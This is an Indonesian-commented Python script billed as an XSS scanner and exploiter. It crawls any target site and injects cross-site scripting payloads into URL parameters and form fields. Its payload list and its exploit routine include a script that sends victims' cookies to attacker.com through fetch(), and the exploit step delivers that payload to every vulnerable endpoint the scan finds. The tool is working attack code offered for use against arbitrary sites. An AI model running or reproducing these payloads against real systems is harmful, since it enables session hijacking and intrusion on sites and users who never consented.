#!/usr/bin/python

import requests
import sys
import os
import re
import random
import string
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Nonaktifkan warning untuk sertifikat SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

os.system("clear" if os.name == "posix" else "cls")

print("""
 __   __ _____ _____   _____  _____  _____  _   _  _   _  _____ ______ 
 \ \ / //  ___/  ___| /  ___||  ___|/  __ \| \ | || \ | ||  ___|| ___ \ 
  \ V / \ `--.\ `--.  \ `--. | |__  | /  \/|  \| ||  \| || |__  | |_/ /
  /   \  `--. \`--. \  `--. \|  __| | |    | . ` || . ` ||  __| |    / 
 / /^\ \/\__/ /\__/ / /\__/ /| |___ | \__/\| |\  || |\  || |___ | |\ \ 
 \/   \/\____/\____/  \____/ \____/  \____/\_| \_/\_| \_/\____/ \_| \_|
                                                                      
""")

# Daftar payload XSS untuk pengujian
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
    "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\"></audio>",
    "<video src=1 href=1 onerror=\"javascript:alert('XSS')\"></video>",
    "<body src=1 href=1 onerror=\"javascript:alert('XSS')\"></body>",
    "<object src=1 href=1 onerror=\"javascript:alert('XSS')\"></object>",
    "<script>alert(document.domain)</script>",
    "<svg/onload=alert('XSS')>",
    "<marquee onstart=alert('XSS')>"
]

# Fungsi untuk membuat session ID acak
def generate_session_id(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

# Kelas utama untuk XSS Scanner
class XSSScanner:
    def __init__(self, target_url, custom_payload=None):
        self.target_url = target_url
        if not self.target_url.startswith('http'):
            self.target_url = 'http://' + self.target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.custom_payload = custom_payload
        self.vulnerable_urls = []
        self.forms_tested = 0
        self.urls_tested = 0
        self.session_id = generate_session_id()
        
    def extract_forms(self, url):
        """Ekstrak semua form dari halaman web"""
        try:
            response = self.session.get(url, verify=False, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                return soup.find_all('form')
            return []
        except Exception as e:
            print(f"[!] Error saat mengekstrak form dari {url}: {e}")
            return []
    
    def extract_links(self, url):
        """Ekstrak semua link dari halaman web"""
        links = set()
        try:
            response = self.session.get(url, verify=False, timeout=10)
            if response.status_code != 200:
                return links
                
            base_url = urlparse(url).scheme + "://" + urlparse(url).netloc
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                if href.startswith('/'):
                    full_url = base_url + href
                elif href.startswith('http'):
                    if urlparse(href).netloc == urlparse(url).netloc:
                        full_url = href
                    else:
                        continue
                else:
                    full_url = urljoin(url, href)
                    
                links.add(full_url)
            return links
        except Exception as e:
            print(f"[!] Error saat mengekstrak link dari {url}: {e}")
            return links
    
    def scan_url_params(self, url):
        """Scan parameter URL untuk kerentanan XSS"""
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return False
            
        query_params = parsed_url.query.split('&')
        vulnerable = False
        
        for param in query_params:
            if '=' not in param:
                continue
                
            param_name, param_value = param.split('=', 1)
            
            # Gunakan semua payload XSS
            for payload in XSS_PAYLOADS:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
                
                try:
                    print(f"[*] Menguji URL: {test_url}")
                    self.urls_tested += 1
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    # Periksa apakah payload ada di respons
                    if payload in response.text:
                        print(f"[+] URL Rentan XSS: {test_url}")
                        print(f"[+] Parameter: {param_name}")
                        print(f"[+] Payload: {payload}")
                        self.vulnerable_urls.append({
                            'url': test_url,
                            'type': 'URL Parameter',
                            'payload': payload,
                            'param': param_name
                        })
                        vulnerable = True
                        
                except Exception as e:
                    print(f"[!] Error saat menguji {test_url}: {e}")
                    
        return vulnerable
                
    def scan_form(self, form, url):
        """Scan form untuk kerentanan XSS"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        
        # Pastikan action URL adalah URL lengkap
        if not action.startswith('http'):
            if action.startswith('/'):
                action = f"{urlparse(url).scheme}://{urlparse(url).netloc}{action}"
            else:
                action = urljoin(url, action)
                
        # Jika action kosong, gunakan URL halaman saat ini
        if not action:
            action = url
            
        inputs = form.find_all(['input', 'textarea'])
        data = {}
        
        # Isi data form dengan nilai default
        for input_field in inputs:
            input_name = input_field.get('name')
            input_type = input_field.get('type', 'text').lower()
            
            if not input_name:
                continue
                
            if input_type == 'submit':
                data[input_name] = input_field.get('value', 'Submit')
            elif input_type in ['text', 'search', 'url', 'email', 'hidden', 'password']:
                data[input_name] = input_field.get('value', 'test')
            elif input_type == 'checkbox' or input_type == 'radio':
                if input_field.get('checked'):
                    data[input_name] = input_field.get('value', 'on')
                    
        vulnerable = False
        
        # Uji setiap input form dengan payload XSS
        for input_field in inputs:
            input_name = input_field.get('name')
            input_type = input_field.get('type', 'text').lower()
            
            if not input_name or input_type in ['submit', 'button', 'image', 'file', 'checkbox', 'radio']:
                continue
                
            # Gunakan semua payload XSS
            for payload in XSS_PAYLOADS:
                test_data = data.copy()
                test_data[input_name] = payload
                
                try:
                    print(f"[*] Menguji form pada {action}")
                    print(f"[*] Parameter: {input_name}")
                    self.forms_tested += 1
                    
                    if method == 'post':
                        response = self.session.post(action, data=test_data, verify=False, timeout=10)
                    else:
                        response = self.session.get(action, params=test_data, verify=False, timeout=10)
                        
                    # Periksa apakah payload ada di respons
                    if payload in response.text:
                        print(f"[+] Form Rentan XSS: {action}")
                        print(f"[+] Parameter: {input_name}")
                        print(f"[+] Metode: {method.upper()}")
                        print(f"[+] Payload: {payload}")
                        self.vulnerable_urls.append({
                            'url': action,
                            'type': f'Form ({method.upper()})',
                            'payload': payload,
                            'param': input_name,
                            'data': test_data
                        })
                        vulnerable = True
                        
                except Exception as e:
                    print(f"[!] Error saat menguji form pada {action}: {e}")
                    
        return vulnerable
                
    def exploit_xss(self, payload_type='alert'):
        """Eksploitasi kerentanan XSS yang ditemukan"""
        if not self.vulnerable_urls:
            print("[!] Tidak ada URL yang rentan untuk dieksploitasi.")
            return
            
        print("\n[*] Eksploitasi Kerentanan XSS:")
        
        if payload_type == 'alert':
            final_payload = "<script>alert('Situs ini rentan terhadap XSS!')</script>"
        elif payload_type == 'cookie':
            final_payload = f"<script>fetch('https://attacker.com/steal?session={self.session_id}&cookie='+encodeURIComponent(document.cookie))</script>"
        elif payload_type == 'custom' and self.custom_payload:
            final_payload = self.custom_payload
        else:
            final_payload = "<script>alert('Situs ini rentan terhadap XSS!')</script>"
            
        for vuln in self.vulnerable_urls:
            print(f"[+] Eksploitasi: {vuln['url']}")
            print(f"[+] Tipe: {vuln['type']}")
            print(f"[+] Parameter: {vuln['param']}")
            
            if vuln['type'].startswith('Form'):
                method = vuln['type'].split('(')[1].strip(')')
                test_data = vuln['data'].copy()
                test_data[vuln['param']] = final_payload
                
                try:
                    if method == 'POST':
                        print("[*] Mengirim payload POST...")
                        response = self.session.post(vuln['url'], data=test_data, verify=False, timeout=10)
                    else:
                        print("[*] Mengirim payload GET...")
                        response = self.session.get(vuln['url'], params=test_data, verify=False, timeout=10)
                        
                    print(f"[+] Payload terkirim! Status: {response.status_code}")
                    
                except Exception as e:
                    print(f"[!] Error saat eksploitasi: {e}")
            else:
                # URL Parameter
                test_url = vuln['url'].replace(vuln['payload'], final_payload)
                
                try:
                    print("[*] Mengirim payload melalui URL...")
                    response = self.session.get(test_url, verify=False, timeout=10)
                    print(f"[+] Payload terkirim! Status: {response.status_code}")
                    
                except Exception as e:
                    print(f"[!] Error saat eksploitasi: {e}")
                    
            print("-" * 50)
                
    def scan(self, max_depth=1, current_depth=0, visited=None):
        """Scan website untuk kerentanan XSS"""
        if visited is None:
            visited = set()
            
        if current_depth > max_depth or self.target_url in visited:
            return
            
        visited.add(self.target_url)
        
        print(f"\n[*] Scanning: {self.target_url}")
        print(f"[*] Depth: {current_depth}/{max_depth}")
        
        # 1. Cari kerentanan di URL parameter
        self.scan_url_params(self.target_url)
        
        # 2. Cari dan uji form di halaman
        forms = self.extract_forms(self.target_url)
        print(f"[*] Ditemukan {len(forms)} form di {self.target_url}")
        
        for form in forms:
            self.scan_form(form, self.target_url)
            
        # 3. Temukan link di halaman dan scan secara rekursif
        if current_depth < max_depth:
            links = self.extract_links(self.target_url)
            print(f"[*] Ditemukan {len(links)} link di {self.target_url}")
            
            for link in links:
                if link not in visited:
                    # Update target URL dan scan secara rekursif
                    original_target = self.target_url
                    self.target_url = link
                    self.scan(max_depth, current_depth + 1, visited)
                    self.target_url = original_target
        
        # Tampilkan hasil
        print("\n" + "="*60)
        print(f"[*] Hasil Scan XSS untuk {self.target_url}")
        print(f"[*] URL diuji: {self.urls_tested}")
        print(f"[*] Form diuji: {self.forms_tested}")
        print(f"[*] Kerentanan ditemukan: {len(self.vulnerable_urls)}")
        
        if self.vulnerable_urls:
            print("\n[+] Detail Kerentanan:")
            for i, vuln in enumerate(self.vulnerable_urls, 1):
                print(f"  {i}. URL: {vuln['url']}")
                print(f"     Tipe: {vuln['type']}")
                print(f"     Parameter: {vuln['param']}")
                print(f"     Payload: {vuln['payload']}")
                print("-" * 50)
                
        print("="*60)


def main():
    print("[*] XSS Scanner dan Exploiter")
    print("[*] Author : XSS Scanner Team")
    print("[*] Github : https://github.com/xss-scanner")
    
    if len(sys.argv) < 2:
        print("\n[*] Penggunaan: python3 " + sys.argv[0] + " target.com [custom_payload] [max_depth]")
        print("[*] Contoh: python3 " + sys.argv[0] + " example.com")
        print("[*] Contoh dengan payload kustom: python3 " + sys.argv[0] + " example.com \"<script>alert(1)</script>\"")
        print("[*] Contoh dengan depth: python3 " + sys.argv[0] + " example.com \"\" 2")
        sys.exit(0)
        
    target = sys.argv[1]
    custom_payload = sys.argv[2] if len(sys.argv) > 2 else None
    max_depth = int(sys.argv[3]) if len(sys.argv) > 3 else 1
    
    print("\n[*] Target: " + target)
    print("[*] Custom Payload: " + (custom_payload if custom_payload else "Tidak ada"))
    print("[*] Max Depth: " + str(max_depth))
    
    confirmation = input("\n[?] Mulai scan? (y/n) > ")
    if confirmation.lower() != 'y':
        print("[!] Scan dibatalkan.")
        sys.exit(0)
        
    scanner = XSSScanner(target, custom_payload)
    scanner.scan(max_depth=max_depth)
    
    if scanner.vulnerable_urls:
        exploit = input("\n[?] Eksploitasi kerentanan yang ditemukan? (y/n) > ")
        if exploit.lower() == 'y':
            payload_type = input("[?] Jenis payload (alert/cookie/custom) > ")
            scanner.exploit_xss(payload_type)
    
    print("\n[*] Scan selesai!")
        

if __name__ == '__main__':
    main()